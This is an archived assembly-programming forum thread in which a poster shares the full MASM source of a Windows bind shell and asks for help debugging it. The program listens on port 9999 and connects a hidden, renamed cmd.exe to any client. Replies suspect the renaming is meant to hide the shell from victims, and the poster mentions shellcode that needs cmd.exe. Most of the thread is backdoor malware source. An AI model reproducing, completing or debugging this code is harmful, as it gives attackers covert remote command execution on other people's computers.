<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>who can debug it?thank you!!! - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=19165" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=3">MAIN</a> &raquo; <a href="../?id=19165">who can debug it?thank you!!!</a></p>
   <div class="post" id="post-148166">
    <div class="subject"><a href="#post-148166">who can debug it?thank you!!!</a></div>
    <div class="body">i write a programe that bind cmd.exe on 9999 port(come from nc.exe) ,but fail,who can help me?thank you!<br />.386<br />.model flat,stdcall<br />option casemap :none<br />include masm32includewindows.inc<br />include masm32includeuser32.inc<br />include masm32includekernel32.inc<br />include masm32includeshlwapi.inc<br />includelib masm32libshlwapi.lib<br />includelib masm32libuser32.lib<br />includelib masm32libkernel32.lib<br />include masm32includewsock32.inc<br />includelib masm32libwsock32.lib<br /><br />TCP_PORT equ 9999<br /><br /><br />BUFFER_SIZE equ 200<br />SESSION STRUCT<br />hReadPipe dd ?<br />hWritePipe dd ?<br />hProcess dd ?<br />sClientSocket SOCKET ?<br />hReadShellThread dd ?<br />hWriteShellThread dd ?<br />SESSION ENDS<br /><br />    .const<br />szCmd db &quot;C:WINNTsystem32zlyi.EXE&quot;,0<br />szExit db &quot;exit&quot;,0dh,0ah,0<br />szSuc db 'sucess',0    ;for debug <br />szErr1 db 'createprocess fail',0  ;for debug<br />szErr2 db 'accept fail',0 ;for debug<br />    .data?<br />hShellStdinPipe dd ?<br />hShellStdoutPipe dd ?    <br />hChildStdinRd dd ?<br />stSin sockaddr_in &lt;?&gt;<br />stSession SESSION &lt;?&gt;<br />stWsa WSADATA &lt;?&gt;<br />hSocket dd ?<br />hcSocket dd ?<br />    .code<br /><br />_StartShell proc uses ebx edi hShellStdin,hShellStdout<br />            local @stProcessInformation:PROCESS_INFORMATION<br />            local @stSi:STARTUPINFO<br />            local @hProcess<br />            mov @hProcess,NULL<br />            mov @stSi.cb,sizeof STARTUPINFO<br />            mov @stSi.lpReserved,NULL<br />            mov @stSi.lpTitle,NULL<br />            mov @stSi.lpDesktop,NULL<br />            mov @stSi.dwX,0<br />            mov @stSi.dwY,0<br />            mov @stSi.dwYSize,0<br />            mov @stSi.wShowWindow,SW_HIDE<br />            mov @stSi.lpReserved2,NULL<br />            mov @stSi.cbReserved2,0<br />            mov ebx,STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES<br />            mov @stSi.dwFlags,ebx<br />            push hShellStdout<br />            pop @stSi.hStdOutput<br />            push hShellStdin<br />            pop @stSi.hStdInput<br />            push hShellStdout<br />            pop @stSi.hStdError<br />                       <br />            invoke CreateProcess,NULL,addr szCmd,NULL,NULL,TRUE,0,<br />                          NULL,NULL,addr @stSi,addr @stProcessInformation<br />            <br />             <br />                mov edi,@stProcessInformation.hProcess<br />                mov @hProcess,edi<br />                invoke CloseHandle,@stProcessInformation.hThread<br />                          <br />            <br />            mov eax,@hProcess<br />            ret<br /><br />_StartShell endp<br /><br />_CreateSession proc <br />                <br />                local @stSecurityAttributes:SECURITY_ATTRIBUTES<br />               <br />                invoke RtlZeroMemory,addr stSession,sizeof stSession<br />                <br /><br />                mov @stSecurityAttributes.nLength,sizeof SECURITY_ATTRIBUTES<br />                xor eax,eax<br />                mov @stSecurityAttributes.lpSecurityDescriptor,eax<br />                mov @stSecurityAttributes.bInheritHandle,TRUE<br />               invoke CreatePipe,addr stSession.hReadPipe,addr hShellStdoutPipe,<br />                        addr @stSecurityAttributes,0<br />                     <br />                .if eax==NULL<br />                 invoke MessageBox,NULL,addr szErr1,NULL,MB_OK or MB_ICONWARNING<br />                 .else<br />                  invoke CreatePipe,addr hShellStdinPipe,addr stSession.hWritePipe,<br />                            addr @stSecurityAttributes,0<br />                    .if eax!=NULL<br />                   <br />                        invoke _StartShell,hShellStdinPipe,hShellStdoutPipe<br />                        mov stSession.hProcess,eax<br />                        invoke CloseHandle,hShellStdinPipe<br />                        invoke CloseHandle,hShellStdoutPipe<br />                        mov eax,TRUE<br />                        ret<br />                     .endif<br />                 .endif<br /><br />_CreateSession endp<br /><br />_SessionReadShellThreadFn proc uses ebx ecx   <br />    local @Buffer:byte<br />    local @Buffer2:byte<br />    local @BytesRead<br />    local @BytesToWrite<br />    .while TRUE<br />            invoke PeekNamedPipe,stSession.hReadPipe,addr @Buffer,sizeof @Buffer,<br />                    addr @BytesRead,NULL,NULL<br />            .break .if eax==NULL<br />            .if  @BytesRead&gt;0<br />                  invoke ReadFile,stSession.hReadPipe,addr @Buffer,sizeof @Buffer,<br />                            addr @BytesRead,NULL<br />            .else<br />                invoke Sleep,50<br />                .continue<br />            .endif<br />            xor eax,eax<br />            xor ecx,ecx<br />            xor edx,edx<br />            mov ebx,@BytesRead<br />            .while ecx&lt;ebx<br />                mov al,@Buffer          <br />                .if al==0ah &amp;&amp; ah!=0dh<br />                  <br />                   mov @Buffer2,0dh<br />                   .endif<br />                <br />                 mov ah,@Buffer<br />                 mov @Buffer2,ah<br />                 inc edx<br />                 inc ecx<br />            .endw<br />            mov @BytesToWrite,edx<br />            invoke send,stSession.sClientSocket,addr @Buffer2,@BytesToWrite,0<br />            .break .if eax&lt;=0<br />      .endw<br />      invoke ExitThread,0<br /><br />_SessionReadShellThreadFn endp<br /><br />_SessionWriteShellThreadFn proc uses ebx <br />        <br />        local @RecvBuffer[1]:byte<br />        local @Buffer:byte<br />        local @EchoBuffer[5]:byte<br />        local @BytesWritten<br />        local @BufferCnt<br />        local @EchoCnt<br />        local @TossCnt<br />        xor ebx,ebx<br />        mov @TossCnt,ebx<br />        mov @BufferCnt,ebx<br />        .while TRUE<br />            invoke recv,stSession.sClientSocket,@RecvBuffer,<br />                    sizeof @RecvBuffer,0<br />            .break .if eax==NULL<br />            mov ah,@RecvBuffer[0]<br />            mov @Buffer,ah<br />            inc ebx<br />            .if ah==0dh<br />                mov @Buffer,0ah<br />                inc ebx               <br />            .endif<br />            invoke StrCmpNI,addr @Buffer,addr szExit,6<br />            .if eax==NULL<br />                invoke ExitThread,0<br />            .endif<br />            mov ah,@RecvBuffer[0]        <br />            .if ah==0ah || ah==0dh<br />               <br />                invoke WriteFile,stSession.hWritePipe,addr @Buffer,<br />                        ebx,addr @BytesWritten,NULL<br />                .break .if eax==NULL<br />                mov @BufferCnt,0<br />               <br />            .endif<br />        .endw<br /><br />_SessionWriteShellThreadFn endp                <br />                                       <br />_doexec proc uses ebx _hClientsocket                       <br />        <br />        local @stSecurityAttributes:SECURITY_ATTRIBUTES<br />        local @ThreadId<br />        local @HandleArray[3]<br />        <br />        invoke _CreateSession<br />        <br />        mov @stSecurityAttributes.nLength,sizeof SECURITY_ATTRIBUTES<br />        mov @stSecurityAttributes.lpSecurityDescriptor,NULL<br />        mov @stSecurityAttributes.bInheritHandle,FALSE<br />        mov ebx,_hClientsocket<br />        mov stSession.sClientSocket,ebx<br />        invoke CreateThread,addr @stSecurityAttributes,0,<br />                            _SessionReadShellThreadFn,NULL,0,<br />                            addr @ThreadId<br />        mov stSession.hReadShellThread,eax<br />        .if eax==NULL<br />            <br />            mov stSession.sClientSocket,INVALID_SOCKET<br />            mov eax,FALSE<br />            ret<br />        .endif<br />        invoke CreateThread,addr @stSecurityAttributes,0,<br />                            _SessionWriteShellThreadFn,NULL,0,<br />                            addr @ThreadId<br />        mov stSession.hWriteShellThread,eax<br />        .if eax==NULL<br />            <br />            mov stSession.sClientSocket,INVALID_SOCKET<br />            invoke TerminateThread,stSession.hWriteShellThread,0<br />            mov eax,FALSE<br />            ret<br />        .endif<br />        push stSession.hReadShellThread<br />        pop @HandleArray[0]<br />        push stSession.hWriteShellThread<br />        pop @HandleArray[1]<br />        push stSession.hProcess<br />        pop @HandleArray[2]<br />        invoke WaitForMultipleObjects,3,addr @HandleArray,FALSE,INFINITE<br />        .if eax==WAIT_OBJECT_0+0<br />            invoke TerminateThread,stSession.hWriteShellThread,0<br />            invoke TerminateProcess,stSession.hProcess,1<br />            .elseif eax==WAIT_OBJECT_0+1<br />                invoke TerminateThread,stSession.hReadShellThread,0<br />                invoke TerminateProcess,stSession.hProcess,1<br />                .elseif eax==WAIT_OBJECT_0+2<br />                    invoke TerminateThread,stSession.hReadShellThread,0<br />                    invoke TerminateProcess,stSession.hWriteShellThread,0<br />        <br />        .endif<br />        invoke closesocket,stSession.sClientSocket                <br />        invoke DisconnectNamedPipe,stSession.hReadPipe<br />        invoke CloseHandle,stSession.hReadPipe<br />        invoke DisconnectNamedPipe,stSession.hWritePipe<br />        invoke CloseHandle,stSession.hWritePipe<br />        invoke CloseHandle,stSession.hReadShellThread<br />        invoke CloseHandle,stSession.hWriteShellThread<br />        invoke CloseHandle,stSession.hProcess<br />        mov eax,TRUE<br />        ret<br /><br />_doexec endp<br />start:<br />        invoke WSAStartup,101h,addr stWsa<br />        invoke socket,AF_INET,SOCK_STREAM,0<br />         mov hSocket,eax<br />        invoke RtlZeroMemory,addr stSin,sizeof stSin<br />        invoke htons,TCP_PORT<br />        mov stSin.sin_port,ax<br />        mov stSin.sin_family,AF_INET<br />        mov stSin.sin_addr,INADDR_ANY<br />        invoke bind,hSocket,addr stSin,sizeof stSin<br />        invoke listen,hSocket,1<br />        .if eax==SOCKET_ERROR<br />        invoke MessageBox,NULL,addr szErr1,NULL,MB_OK or MB_ICONWARNING<br />        .endif<br />       <br />        .while TRUE<br />            invoke accept,hSocket,NULL,NULL<br />            .if eax==INVALID_SOCKET <br />         invoke MessageBox,NULL,addr szErr2,NULL,MB_OK or MB_ICONWARNING<br />  <br />            jmp exit<br />            .else <br />            <br />             mov hcSocket,eax<br />             invoke _doexec,hcSocket<br />             .endif<br />        .endw    <br /> exit:  <br />        invoke closesocket,hSocket<br />        invoke closesocket,hcSocket     <br />        invoke WSACleanup<br />        invoke ExitProcess,NULL<br /><br />end start</div>
    <div class="meta">Posted on 2004-08-16 03:51:41 by </div>
   </div>
   <div class="post" id="post-148167">
    <div class="subject"><a href="#post-148167">who can debug it?thank you!!!</a></div>
    <div class="body">for security,i change cmd.exe into zlyi.exe</div>
    <div class="meta">Posted on 2004-08-16 03:53:04 by </div>
   </div>
   <div class="post" id="post-148176">
    <div class="subject"><a href="#post-148176">who can debug it?thank you!!!</a></div>
    <div class="body">Hrm, &quot;for security&quot; - you mean so people won't see cmd.exe in their process list and realize they're running shellcode?</div>
    <div class="meta">Posted on 2004-08-16 06:07:31 by f0dder</div>
   </div>
   <div class="post" id="post-148180">
    <div class="subject"><a href="#post-148180">who can debug it?thank you!!!</a></div>
    <div class="body">When I write a program, I write it part by part and test it part by part. But in your case, you wrote an entire program (so you exactly know what you are doing else you couldn't write it), but you have not the slightest idea why it doesn't work. interesting...</div>
    <div class="meta">Posted on 2004-08-16 06:30:28 by Mbee</div>
   </div>
   <div class="post" id="post-148210">
    <div class="subject"><a href="#post-148210">who can debug it?thank you!!!</a></div>
    <div class="body">some shellcode need cmd.exe net.exe,or net1.exe ,so i change it.<br />i have debuged....</div>
    <div class="meta">Posted on 2004-08-16 19:14:59 by </div>
   </div>
  </div>
 </body>
</html>